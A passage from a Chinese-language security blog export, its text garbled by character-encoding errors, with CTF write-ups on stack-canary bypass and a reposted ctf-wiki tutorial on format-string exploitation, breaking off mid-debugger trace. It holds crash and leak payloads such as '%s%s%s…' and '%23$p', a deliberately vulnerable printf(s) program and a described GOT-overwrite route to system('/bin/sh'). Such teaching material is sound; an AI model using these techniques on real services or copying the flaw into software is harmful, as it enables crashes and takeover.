<h1 id="äºŒã€ä¾‹é¢˜"><a href="#äºŒã€ä¾‹é¢˜" class="headerlink" title="äºŒã€ä¾‹é¢˜"></a>äºŒã€ä¾‹é¢˜</h1><h3 id="pwn04â€”â€”æ¥è‡ªctfshowçš„pwnå…¥é—¨"><a href="#pwn04â€”â€”æ¥è‡ªctfshowçš„pwnå…¥é—¨" class="headerlink" title="pwn04â€”â€”æ¥è‡ªctfshowçš„pwnå…¥é—¨"></a>pwn04â€”â€”æ¥è‡ªctfshowçš„pwnå…¥é—¨</h3><p>checksecä¸€ä¸‹<img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328155307.png"></p>
<p>å¼€å¯äº†nxï¼Œcanaryï¼Œéƒ¨åˆ†relroç­‰ä¿æŠ¤æªæ–½ï¼Œ</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328155500.png"></p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328155325.png"></p>
<p>è¿è¡Œä¸€ä¸‹é™„ä»¶ï¼Œå‘ç°å¯ä»¥æŠŠä½ è¾“å…¥çš„ä¸œè¥¿æ‰“å°å‡ºæ¥ï¼Œè¿˜æ˜¯é‡å¤ä¸¤æ¬¡ï¼Œå› æ­¤å¯ä»¥å€Ÿæ­¤æŠŠcanaryæ³„éœ²å‡ºæ¥ã€‚ï¼ˆå…¶å®åº”è¯¥ä¹Ÿçœ‹å‡ºæ¥äº†å§ï¼Œè¿™é‡Œä¹Ÿæœ‰ç€å¾ˆæ˜æ˜¾çš„å­—ç¬¦ä¸²æ¼æ´ï¼Œæ‰€ä»¥è¿˜æœ‰ä¸€ç§è§£æ³•å°±æ˜¯å»ç®—canaryçš„ç›¸å¯¹å­—ç¬¦ä¸²çš„åç§»ï¼Œç„¶åæŠŠå®ƒæ³„éœ²å‡ºæ¥ï¼‰è¿›å…¥idaï¼Œå‡½æ•°å¾ˆå°‘ï¼Œå·¦è¾¹ä¹Ÿèƒ½å‘ç°ç»™å‡ºäº†ç³»ç»Ÿå‡½æ•°ï¼Œè¯´æ˜åªè¦èƒ½æ­£å¸¸è¦†ç›–è¿”å›åœ°å€å°±å¯ä»¥è·å–shellï¼Œç‚¹å¼€bufè¿›å…¥æ ˆä¸­æŸ¥çœ‹åˆ°canaryçš„ä½ç½®</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328155329.png"></p>
<p>è®¡ç®—ä¸€ä¸‹bufåˆ°var_cçš„åç§»ï¼Œè¦†ç›–åˆ°Var_Cçš„æœ€åä¸€ä½æ•°ï¼Œå› ä¸ºæ˜¯0x00ä¼šé€ æˆæˆªæ–­ï¼Œæ‰€ä»¥ä¸€åŒè¦†ç›–ï¼Œåˆ°æ—¶å€™å‡å»è¦†ç›–çš„å€¼å°±è¡Œäº†</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328161657.png"></p>
<p>å…¶å®è¿™é¢˜è²Œä¼¼å°±æ˜¯ä¸Šé¢å½“åšä¾‹é¢˜çš„é¢˜ç›®ï¼Œå¯èƒ½æ˜¯å‡ºé¢˜äººä¹Ÿè¯»è¿‡ctf wikiå¹¶ä¸”ç…§ç€æ ·å­å‡ºçš„ï¼Œtqlï¼</p>
<h3 id="Mary-Mortonâ€”â€”æ¥è‡ªæ”»é˜²ä¸–ç•Œè¿›é˜¶åŒº"><a href="#Mary-Mortonâ€”â€”æ¥è‡ªæ”»é˜²ä¸–ç•Œè¿›é˜¶åŒº" class="headerlink" title="Mary_Mortonâ€”â€”æ¥è‡ªæ”»é˜²ä¸–ç•Œè¿›é˜¶åŒº"></a>Mary_Mortonâ€”â€”æ¥è‡ªæ”»é˜²ä¸–ç•Œè¿›é˜¶åŒº</h3><p>checksec ä¸€ä¸‹ï¼ŒæŸ¥çœ‹ä¿æŠ¤<img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328165236.png"></p>
<p>å¼€å¯äº†éƒ¨åˆ†relroï¼Œnxï¼Œcanary</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328170729.png"></p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328180109.png"></p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328180112.png"></p>
<p>é¦–å…ˆï¼Œä¸»å‡½æ•°æ˜¯ä¸ªæ— é™çš„å¾ªç¯ç»“æ„ï¼Œä¸åœçš„å¯ä»¥è¿›å…¥ä¸‰ä¸ªåˆ†æ”¯ï¼Œåœ¨ç¬¬äºŒä¸ªåˆ†æ”¯ä¸­æœ‰ç€å­—ç¬¦ä¸²æ¼æ´ï¼Œç¬¬ä¸‰ä¸ªåˆ†æ”¯ä¸­æœ‰ç€æ ˆæº¢å‡ºæ¼æ´ï¼Œå¦‚æœåªæ˜¯ç®€å•å¤„ç†ï¼Œé‚£å°±æ˜¯å…ˆç”¨å­—ç¬¦ä¸²æ¼æ´æ³„éœ²canaryçš„å€¼ï¼Œå†ç”¨æ ˆæº¢å‡ºè¿›è¡Œè·³è½¬è·å–flag</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328175843.png"></p>
<p>åœ¨gdbä¸­æ–­ç‚¹åˆ°printfä¸­å¯ä»¥ç®—å‡ºï¼Œcanaryæ˜¯æ ˆä¸Šçš„ç¬¬18ä¸ªå˜é‡ï¼Œä»¥åŠ64ä½ä¼ å‚ä¸­å‰å…­ä¸ªæ˜¯å¯„å­˜å™¨ä¼ å‚ï¼Œæ‰€ä»¥canaryç›¸å¯¹äºå­—ç¬¦ä¸²æ˜¯ç¬¬23ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¦å†™æˆ%23$pï¼Œç„¶åå°±æ­£å¸¸ç®—æ ˆæº¢å‡ºåç§»å³å¯ã€‚expå¦‚ä¸‹ï¼š</p>
<p><img src="/2021/03/28/2021-03-28-canary%E7%BB%95%E8%BF%87/QQ%E5%9B%BE%E7%89%8720210328185226.png"></p>
<p>ä½†æ˜¯æˆ‘åœ¨æ”»é˜²ä¸–ç•Œçš„wpä¸­çœ‹è§ï¼Œæœ‰ä¸ªå¤§ä½¬è¿˜æ‹¥æœ‰å…¶ä»–ä¸¤ä¸ªæ–¹å¼ï¼Œæ–¹å¼1:è¾“å…¥2ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å°†printfçš„gotåœ°å€ä¿®æ”¹ä¸ºsystemçš„pltåœ°å€ï¼Œå†æ¬¡è¾“å…¥2ï¼Œè¾“å…¥â€™/bin/sh\x00â€™ï¼Œç›¸å½“äºæ‰§è¡Œsystem(â€˜/bin/sh\x00â€™)æ–¹å¼2:è¾“å…¥2ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å°†exitçš„gotåœ°å€ä¿®æ”¹ä¸ºsub_4008DAå‡½æ•°åœ°å€ï¼ˆè¯¥å‡½æ•°å¯ä»¥ç›´æ¥æ‰§è¡Œcat./flagï¼‰,å†æ¬¡è¾“å…¥3ï¼Œè°ƒç”¨sub_4008DAå‡½æ•°catflagã€‚è¯¦ç»†å¯ä»¥åˆ°æ”»é˜²ä¸–ç•Œè‡ªè¡ŒæŸ¥çœ‹ï¼Œåˆ°å¤§ä½¬tqlï¼ï¼ï¼ï¼ï¼ï¼</p>
]]></content>
      <tags>
        <tag>canary</tag>
      </tags>
  </entry>
  <entry>
    <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨</title>
    <url>/2021/03/27/2021-03-27-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="è½¬è½½è‡ªctf-wiki"><a href="#è½¬è½½è‡ªctf-wiki" class="headerlink" title="è½¬è½½è‡ªctf-wiki"></a>è½¬è½½è‡ªctf-wiki</h1><h1 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨</h1><p>å…¶å®ï¼Œåœ¨ä¸Šä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬å±•ç¤ºäº†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„ä¸¤ä¸ªåˆ©ç”¨æ‰‹æ®µ</p>
<ul>
<li>ä½¿ç¨‹åºå´©æºƒï¼Œå› ä¸º%så¯¹åº”çš„å‚æ•°åœ°å€ä¸åˆæ³•çš„æ¦‚ç‡æ¯”è¾ƒå¤§ã€‚</li>
<li>æŸ¥çœ‹è¿›ç¨‹å†…å®¹ï¼Œæ ¹æ®%dï¼Œ%fè¾“å‡ºäº†æ ˆä¸Šçš„å†…å®¹ã€‚</li>
</ul>
<p>ä¸‹é¢æˆ‘ä»¬ä¼šå¯¹äºæ¯ä¸€æ–¹é¢è¿›è¡Œæ›´åŠ è¯¦ç»†çš„è§£é‡Šã€‚</p>
<h2 id="ç¨‹åºå´©æºƒ"><a href="#ç¨‹åºå´©æºƒ" class="headerlink" title="ç¨‹åºå´©æºƒ"></a>ç¨‹åºå´©æºƒ</h2><p>é€šå¸¸æ¥è¯´ï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä½¿å¾—ç¨‹åºå´©æºƒæ˜¯æœ€ä¸ºç®€å•çš„åˆ©ç”¨æ–¹å¼ï¼Œå› ä¸ºæˆ‘ä»¬åªéœ€è¦è¾“å…¥è‹¥å¹²ä¸ª%så³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">%s%s%s%s%s%s%s%s%s%s%s%s%s%s<br></code></pre></td></tr></table></figure>

<p>è¿™æ˜¯å› ä¸ºæ ˆä¸Šä¸å¯èƒ½æ¯ä¸ªå€¼éƒ½å¯¹åº”äº†åˆæ³•çš„åœ°å€ï¼Œæ‰€ä»¥æ€»æ˜¯ä¼šæœ‰æŸä¸ªåœ°å€å¯ä»¥ä½¿å¾—ç¨‹åºå´©æºƒã€‚è¿™ä¸€åˆ©ç”¨ï¼Œè™½ç„¶æ”»å‡»è€…æœ¬èº«ä¼¼ä¹å¹¶ä¸èƒ½æ§åˆ¶ç¨‹åºï¼Œä½†æ˜¯è¿™æ ·å´å¯ä»¥é€ æˆç¨‹åºä¸å¯ç”¨ã€‚æ¯”å¦‚è¯´ï¼Œå¦‚æœè¿œç¨‹æœåŠ¡æœ‰ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ”»å‡»å…¶å¯ç”¨æ€§ï¼Œä½¿æœåŠ¡å´©æºƒï¼Œè¿›è€Œä½¿å¾—ç”¨æˆ·ä¸èƒ½å¤Ÿè®¿é—®ã€‚</p>
<h2 id="æ³„éœ²å†…å­˜"><a href="#æ³„éœ²å†…å­˜" class="headerlink" title="æ³„éœ²å†…å­˜"></a>æ³„éœ²å†…å­˜</h2><p>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥è·å–æˆ‘ä»¬æ‰€æƒ³è¦è¾“å‡ºçš„å†…å®¹ã€‚ä¸€èˆ¬ä¼šæœ‰å¦‚ä¸‹å‡ ç§æ“ä½œ</p>
<ul>
<li>æ³„éœ²æ ˆå†…å­˜<ul>
<li>  è·å–æŸä¸ªå˜é‡çš„å€¼</li>
<li>  è·å–æŸä¸ªå˜é‡å¯¹åº”åœ°å€çš„å†…å­˜</li>
</ul>
</li>
<li>æ³„éœ²ä»»æ„åœ°å€å†…å­˜<ul>
<li>  åˆ©ç”¨GOTè¡¨å¾—åˆ°libcå‡½æ•°åœ°å€ï¼Œè¿›è€Œè·å–libcï¼Œè¿›è€Œè·å–å…¶å®ƒlibcå‡½æ•°åœ°å€</li>
<li>  ç›²æ‰“ï¼Œdumpæ•´ä¸ªç¨‹åºï¼Œè·å–æœ‰ç”¨ä¿¡æ¯ã€‚</li>
</ul>
</li>
</ul>
<h3 id="æ³„éœ²æ ˆå†…å­˜"><a href="#æ³„éœ²æ ˆå†…å­˜" class="headerlink" title="æ³„éœ²æ ˆå†…å­˜"></a>æ³„éœ²æ ˆå†…å­˜</h3><p>ä¾‹å¦‚ï¼Œç»™å®šå¦‚ä¸‹ç¨‹åº</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">0x22222222</span>, c = <span class="hljs-number">-1</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç„¶åï¼Œæˆ‘ä»¬ç®€å•ç¼–è¯‘ä¸€ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">âœ  leakmemory git:(master) âœ— gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c<br>leakmemory.c: In function â€˜mainâ€™:<br>leakmemory.c:7:10: warning: format not a string literal and no format arguments [-Wformat-security]<br>   printf(s);<br>          ^<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºï¼Œç¼–è¯‘å™¨æŒ‡å‡ºäº†æˆ‘ä»¬çš„ç¨‹åºä¸­æ²¡æœ‰ç»™å‡ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°çš„é—®é¢˜ã€‚ä¸‹é¢ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ï¼Œå¦‚ä½•è·å–å¯¹åº”çš„æ ˆå†…å­˜ã€‚</p>
<p>æ ¹æ®Cè¯­è¨€çš„è°ƒç”¨è§„åˆ™ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ä¼šæ ¹æ®æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›´æ¥ä½¿ç”¨æ ˆä¸Šè‡ªé¡¶å‘ä¸Šçš„å˜é‡ä½œä¸ºå…¶å‚æ•°(64ä½ä¼šæ ¹æ®å…¶ä¼ å‚çš„è§„åˆ™è¿›è¡Œè·å–)ã€‚è¿™é‡Œæˆ‘ä»¬ä¸»è¦ä»‹ç»32ä½ã€‚</p>
<h4 id="è·å–æ ˆå˜é‡æ•°å€¼"><a href="#è·å–æ ˆå˜é‡æ•°å€¼" class="headerlink" title="è·å–æ ˆå˜é‡æ•°å€¼"></a>è·å–æ ˆå˜é‡æ•°å€¼</h4><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥è·å–æ ˆä¸Šå˜é‡çš„æ•°å€¼ã€‚æˆ‘ä»¬å¯ä»¥è¯•ä¸€ä¸‹ï¼Œè¿è¡Œç»“æœå¦‚ä¸‹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">âœ  leakmemory git:(master) âœ— ./leakmemory<br><span class="hljs-meta">%</span><span class="bash">08x.%08x.%08x</span><br>00000001.22222222.ffffffff.%08x.%08x.%08x<br>ffcfc400.000000c2.f765a6bb<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ç¡®å®å¾—åˆ°äº†ä¸€äº›å†…å®¹ã€‚ä¸ºäº†æ›´åŠ ç»†è‡´çš„è§‚å¯Ÿï¼Œæˆ‘ä»¬åˆ©ç”¨GDBæ¥è°ƒè¯•ä¸€ä¸‹ï¼Œä»¥ä¾¿äºéªŒè¯æˆ‘ä»¬çš„æƒ³æ³•ï¼Œè¿™é‡Œåˆ é™¤äº†ä¸€äº›ä¸å¿…è¦çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬åªå…³æ³¨ä»£ç æ®µä»¥åŠæ ˆã€‚</p>
<p>é¦–å…ˆï¼Œå¯åŠ¨ç¨‹åºï¼Œå°†æ–­ç‚¹ä¸‹è½½printfå‡½æ•°å¤„</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">âœ  leakmemory git:(master) âœ— gdb leakmemory<br>gefâ¤  b printf<br>Breakpoint 1 at 0x8048330<br></code></pre></td></tr></table></figure>

<p>ä¹‹åï¼Œè¿è¡Œç¨‹åº</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gefâ¤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br><span class="hljs-meta">%</span><span class="bash">08x.%08x.%08x</span><br></code></pre></td></tr></table></figure>

<p>æ­¤æ—¶ï¼Œç¨‹åºç­‰å¾…æˆ‘ä»¬çš„è¾“å…¥ï¼Œè¿™æ—¶æˆ‘ä»¬è¾“å…¥%08x.%08x.%08xï¼Œç„¶åæ•²å‡»å›è½¦ï¼Œæ˜¯ç¨‹åºç»§ç»­è¿è¡Œï¼Œå¯ä»¥çœ‹å‡ºç¨‹åºé¦–å…ˆæ–­åœ¨äº†ç¬¬ä¸€æ¬¡è°ƒç”¨printfå‡½æ•°çš„ä½ç½®</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28	printf.c: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•.<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ code:i386 ]â”€â”€â”€â”€<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> â†’ 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   â†³  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ stack ]â”€â”€â”€â”€<br>[&#x27;0xffffccec&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccecâ”‚+0x00: 0x080484bf  â†’  &lt;main+84&gt; add esp, 0x20	 â† $esp<br>0xffffccf0â”‚+0x04: 0x08048563  â†’  &quot;%08x.%08x.%08x.%s&quot;<br>0xffffccf4â”‚+0x08: 0x00000001<br>0xffffccf8â”‚+0x0c: 0x22222222<br>0xffffccfcâ”‚+0x10: 0xffffffff<br>0xffffcd00â”‚+0x14: 0xffffcd10  â†’  &quot;%08x.%08x.%08x&quot;<br>0xffffcd04â”‚+0x18: 0xffffcd10  â†’  &quot;%08x.%08x.%08x&quot;<br>0xffffcd08â”‚+0x1c: 0x000000c2<br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºï¼Œæ­¤æ—¶æ­¤æ—¶å·²ç»è¿›å…¥äº†printfå‡½æ•°ä¸­ï¼Œæ ˆä¸­ç¬¬ä¸€ä¸ªå˜é‡ä¸ºè¿”å›åœ°å€ï¼Œç¬¬äºŒä¸ªå˜é‡ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€ï¼Œç¬¬ä¸‰ä¸ªå˜é‡ä¸ºaçš„å€¼ï¼Œç¬¬å››ä¸ªå˜é‡ä¸ºbçš„å€¼ï¼Œç¬¬äº”ä¸ªå˜é‡ä¸ºcçš„å€¼ï¼Œç¬¬å…­ä¸ªå˜é‡ä¸ºæˆ‘ä»¬è¾“å…¥çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å¯¹åº”çš„åœ°å€ã€‚ç»§ç»­è¿è¡Œç¨‹åº</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gefâ¤  c<br>Continuing.<br>00000001.22222222.ffffffff.%08x.%08x.%08x<br><br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºï¼Œç¨‹åºç¡®å®è¾“å‡ºäº†æ¯ä¸€ä¸ªå˜é‡å¯¹åº”çš„æ•°å€¼ï¼Œå¹¶ä¸”æ–­åœ¨äº†ä¸‹ä¸€ä¸ªprintfå¤„</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Breakpoint 1, __printf (format=0xffffcd10 &quot;%08x.%08x.%08x&quot;) at printf.c:28<br>28	in printf.c<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ code:i386 ]â”€â”€â”€â”€<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   ax, ax<br> â†’ 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;<br>   â†³  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]<br>      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret<br>      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]<br>      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ stack ]â”€â”€â”€â”€<br>[&#x27;0xffffccfc&#x27;, &#x27;l8&#x27;]<br>8<br>0xffffccfcâ”‚+0x00: 0x080484ce  â†’  &lt;main+99&gt; add esp, 0x10	 â† $esp<br>0xffffcd00â”‚+0x04: 0xffffcd10  â†’  &quot;%08x.%08x.%08x&quot;<br>0xffffcd04â”‚+0x08: 0xffffcd10  â†’  &quot;%08x.%08x.%08x&quot;<br>0xffffcd08â”‚+0x0c: 0x000000c2<br>0xffffcd0câ”‚+0x10: 0xf7e8b6bb  â†’  &lt;handle_intel+107&gt; add esp, 0x10<br>0xffffcd10â”‚+0x14: &quot;%08x.%08x.%08x&quot;	 â† $eax<br>0xffffcd14â”‚+0x18: &quot;.%08x.%08x&quot;<br>0xffffcd18â”‚+0x1c: &quot;x.%08x&quot;<br></code></pre></td></tr></table></figure>

<p>æ­¤æ—¶ï¼Œç”±äºæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸º%x%x%xï¼Œæ‰€ä»¥ï¼Œç¨‹åº ä¼šå°†æ ˆä¸Šçš„0xffffcd04åŠå…¶ä¹‹åçš„æ•°å€¼åˆ†åˆ«ä½œä¸ºç¬¬ä¸€ï¼Œç¬¬äºŒï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æŒ‰ç…§intå‹è¿›è¡Œè§£æï¼Œåˆ†åˆ«è¾“å‡ºã€‚ç»§ç»­è¿è¡Œï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœå»ï¼Œç¡®å®å’Œæƒ³è±¡ä¸­çš„ä¸€æ ·ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gefâ¤  c<br>Continuing.<br>ffffcd10.000000c2.f7e8b6bb[Inferior 1 (process 57077) exited normally]<br></code></pre></td></tr></table></figure>

<p>å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨%pæ¥è·å–æ•°æ®ï¼Œå¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">%p.%p.%p<br><span class="hljs-number">00000001.22222222</span>.ffffffff.%p.%p.%p<br><span class="hljs-number">0xfff328c0</span><span class="hljs-number">.0</span>xc2<span class="hljs-number">.0</span>xf75c46bb<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¹¶ä¸æ˜¯æ¯æ¬¡å¾—åˆ°çš„ç»“æœéƒ½ä¸€æ · ï¼Œå› ä¸ºæ ˆä¸Šçš„æ•°æ®ä¼šå› ä¸ºæ¯æ¬¡åˆ†é…çš„å†…å­˜é¡µä¸åŒè€Œæœ‰æ‰€ä¸åŒï¼Œè¿™æ˜¯å› ä¸ºæ ˆæ˜¯ä¸å¯¹å†…å­˜é¡µåšåˆå§‹åŒ–çš„ã€‚</p>
<p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬ä¸Šé¢ç»™å‡ºçš„æ–¹æ³•ï¼Œéƒ½æ˜¯ä¾æ¬¡è·å¾—æ ˆä¸­çš„æ¯ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬æœ‰æ²¡æœ‰åŠæ³•ç›´æ¥è·å–å‘¢</strong>ï¼Ÿè‚¯å®šæ˜¯å¯ä»¥çš„å•¦ã€‚æ–¹æ³•å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">%n$x<br></code></pre></td></tr></table></figure>

<p>åˆ©ç”¨å¦‚ä¸‹çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å–åˆ°å¯¹åº”çš„ç¬¬n+1ä¸ªå‚æ•°çš„æ•°å€¼ã€‚ä¸ºä»€ä¹ˆè¿™é‡Œè¦è¯´æ˜¯å¯¹åº”ç¬¬n+1ä¸ªå‚æ•°å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºæ ¼å¼åŒ–å‚æ•°é‡Œé¢çš„næŒ‡çš„æ˜¯è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²å¯¹åº”çš„ç¬¬nä¸ªè¾“å‡ºå‚æ•°ï¼Œé‚£ç›¸å¯¹äºè¾“å‡ºå‡½æ•°æ¥è¯´ï¼Œå°±æ˜¯ç¬¬n+1ä¸ªå‚æ•°äº†ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬å†æ¬¡ä»¥gdbè°ƒè¯•ä¸€ä¸‹ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">âœ  leakmemory git:(master) âœ— gdb leakmemory<br>gefâ¤  b printf<br>Breakpoint 1 at 0x8048330<br>gefâ¤  r<br>Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory<br><span class="hljs-meta">%</span><span class="bash">3<span class="hljs-variable">$x</span></span><br><br>Breakpoint 1, __printf (format=0x8048563 &quot;%08x.%08x.%08x.%s\n&quot;) at printf.c:28<br>28	printf.c: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•.<br><br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ code:i386 ]â”€â”€â”€â”€<br>   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]<br>   0xf7e4466d                  nop<br>   0xf7e4466e                  xchg   